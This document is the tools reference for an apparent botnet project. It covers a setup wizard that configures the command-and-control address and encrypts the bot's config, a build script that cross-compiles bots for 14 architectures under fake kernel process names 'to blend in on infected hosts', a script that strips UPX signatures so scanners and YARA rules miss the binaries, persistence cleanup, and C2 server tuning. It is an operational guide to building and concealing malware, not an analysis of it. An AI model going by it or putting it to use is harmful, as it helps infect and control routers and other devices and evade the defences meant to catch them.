# Tools

Quick reference for everything in the `tools/` directory.

---

### setup.py (project root)

The main build wizard. Handles first-time setup and rebuilds.

- **Option 1 — Full Setup**: Prompts for C2 address, telnet port, auth secrets, generates TLS certs, rotates the AES key, encrypts all config blobs, and cross-compiles bot binaries for 14 architectures.
- **Option 2 — Update C2 Only**: Changes the C2 address and re-obfuscates it without touching other config. Used when moving to a new server.

On every run it generates a unique random AES-128-CTR key, patches the XOR byte functions in `bot/opsec.go`, and re-encrypts all sensitive string blobs in `bot/config.go`.

---

### crypto.go

Standalone AES-128-CTR encrypt/decrypt tool. Uses the same key as the bot (patched by setup.py).

```
go run tools/crypto.go encrypt <string>              # Encrypt a plaintext string → hex blob
go run tools/crypto.go encrypt-slice <a> <b> ...     # Encrypt multiple strings as a null-separated slice
go run tools/crypto.go decrypt <hex>                 # Decrypt a hex blob → plaintext
go run tools/crypto.go decrypt-slice <hex>           # Decrypt a hex blob → string slice (one per line)
go run tools/crypto.go generate                      # Regenerate all encrypted blobs for config.go
go run tools/crypto.go verify                        # Verify config.go blobs decrypt correctly
go run tools/crypto.go resetconfig                   # Reset key + blobs back to zero-key source state
```

The `resetconfig` command is useful after a build when you want to restore the source code to its default shipping state (all blobs encrypted under the 0x00 key). This is the reverse of what setup.py does.

---

### build.sh

Cross-compiles the bot for 14 Linux architectures. Each binary gets a fake kernel process name (e.g., `kworkerd0`, `ethd0`, `ip6addrd`) to blend in on infected hosts. Applies `-trimpath -ldflags="-s -w"` to strip debug info, compresses with UPX, then calls `deUPX.py` to remove UPX signatures.

Output goes to `bins/` in the project root.

| Binary Name   | Architecture | Notes                        |
|---------------|-------------|------------------------------|
| kworkerd0     | x86 (386)   | 32-bit Intel/AMD             |
| ethd0         | x86_64      | 64-bit Intel/AMD             |
| mdsync1       | ARMv7       | Raspberry Pi 2/3             |
| ksnapd0       | ARMv5       | Older ARM devices            |
| kswapd1       | ARMv6       | Raspberry Pi 1               |
| ip6addrd      | ARM64       | RPi 4, Android, modern ARM   |
| deferwqd      | MIPS        | Routers (big-endian)         |
| devfreqd0     | MIPSLE      | Routers (little-endian)      |
| kintegrity0   | MIPS64      | 64-bit MIPS big-endian       |
| biosd0        | MIPS64LE    | 64-bit MIPS little-endian    |
| kpsmoused0    | PPC64       | PowerPC 64-bit big-endian    |
| ttmswapd      | PPC64LE     | PowerPC 64-bit little-endian |
| vredisd0      | s390x       | IBM System/390               |
| kvmirqd       | RISC-V 64   | RISC-V 64-bit                |

---

### deUPX.py

Strips cosmetic UPX signature strings from compressed binaries so that simple `strings` or YARA scans won't flag them as UPX-packed. Replaces info strings, copyright notices, and URLs with random obfuscation padding.

Does **not** touch structural UPX markers (`UPX!`, `UPX0`, `UPX1`) — those are required by the decompressor stub at runtime.

```
python3 tools/deUPX.py <file_or_directory>       # Strip UPX signatures in place
python3 tools/deUPX.py bins/ --dry-run           # Scan only, don't modify
python3 tools/deUPX.py target.bin -v             # Verbose output
```

Called automatically by `build.sh` after compilation.

---

### cleanup.sh

Emergency removal of all bot persistence artifacts from the local machine. Run as root if the bot was accidentally executed outside debug mode.

Removes:
- Systemd service 
- Hidden directory 
- Cron jobs (persistence script + all 14 bot binary names)
- rc.local entries
- Instance lock and speed cache 
- Running bot processes (all known binary names)

```
sudo bash tools/cleanup.sh
```

---

### fix_botkill.sh

Server-side tuning script. Increases file descriptor limits, opens port 443, and tunes TCP buffer sizes for handling large numbers of bot connections. Run on the CNC server before starting.

```
sudo bash tools/fix_botkill.sh
```

---

### upx

Bundled UPX binary (Linux amd64). Used by `build.sh` for compressing bot binaries from ~8MB down to ~2.4MB.
